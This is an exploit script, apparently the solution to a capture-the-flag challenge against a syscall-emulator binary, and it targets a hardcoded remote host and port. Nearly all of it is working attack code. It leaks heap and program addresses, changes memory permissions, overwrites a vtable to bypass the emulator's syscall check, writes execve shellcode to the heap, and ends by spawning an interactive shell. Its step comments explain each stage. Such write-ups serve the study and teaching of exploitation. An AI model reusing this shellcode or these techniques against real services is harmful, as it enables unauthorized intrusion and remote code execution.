from ptrlib import *

def syscall(n, args, recv=True):
    sock.sendlineafter("syscall: ", str(n))
    for i in range(3):
        if i < len(args):
            sock.sendlineafter(": ", str(args[i]))
        else:
            sock.sendlineafter(": ", "0")
    if recv:
        sock.recvuntil("retval: ")
        return int(sock.recvline(), 16)

elf = ELF("../distfiles/chall")
#sock = Process("../distfiles/chall")
sock = Socket("13.231.207.73", 9006)
vtable = 0x202ce0
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# 1) brk(0)
#  Call brk(0) to leak heap base.
heap = syscall(12, [0]) - 0x21000
logger.info("heap = " + hex(heap))

# 2) writev(1, heap + 0x11e70, 1)
#  Call writev to leak proc base.
#  The first 16 bytes of Emulator (vtable, rax) can be regarded as an iovec.
syscall(20, [1, heap + 0x11e70, 1], recv=False)
sock.recvline()
proc = u64(sock.recv(8)) - elf.symbol("_ZN8Emulator3setENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERm")
logger.info("proc = " + hex(proc))

# 3) mprotect(proc + 0x202000, 0x1000, PROT_READ | PROT_WRITE)
#  Before overwriting the vtable, we have to make the area writable.
syscall(10, [proc + 0x202000, 0x1000, 0b011])

# 4) mprotect(heap + 0x11000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
#  Also we make the heap executable.
#  This is because we will write "xor rax, rax; ret;" gadget here.
syscall(10, [heap + 0x11000, 0x1000, 0b111])
rop_xor_rax_rax_ret = heap + 0x11e90

# 5) readv(0, heap + 0x11e70, 1)
#  Call readv to disable Emulator::check.
#  Same principle as step 2, we can overwrite the vtable.
payload = b''
payload += p64(proc + elf.symbol("_ZN8Emulator3setENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERm"))
payload += p64(rop_xor_rax_rax_ret)
syscall(19, [0, heap + 0x11e70, 1], recv=False)
sock.send(payload)

# Now, arg3 is regarded as ROP gadget!

# 6) read(0, heap + 0x11000, 0xc3c03148)
#  Write shellcode to heap.
#  (We can bypass Emulator::check because 0xc3c03148 == xor rax, rax; ret;)
syscall(0, [0, heap + 0x11000, 0xc3c03148], recv=False)
sock.send(shellcode)

# 7) read(0, proc + vtable + 8, 0xc3c03148)
#  Call read to overwrite Emulator::check to our shellcode.
payload = p64(heap + 0x11000)
syscall(0, [0, proc + vtable + 8, 0xc3c03148], recv=False)
sock.send(payload)

# 8) get the shell!
#  Now Emulator::check points to our shellcode!
syscall(0, [0, 0, 0], recv=False)

sock.interactive()
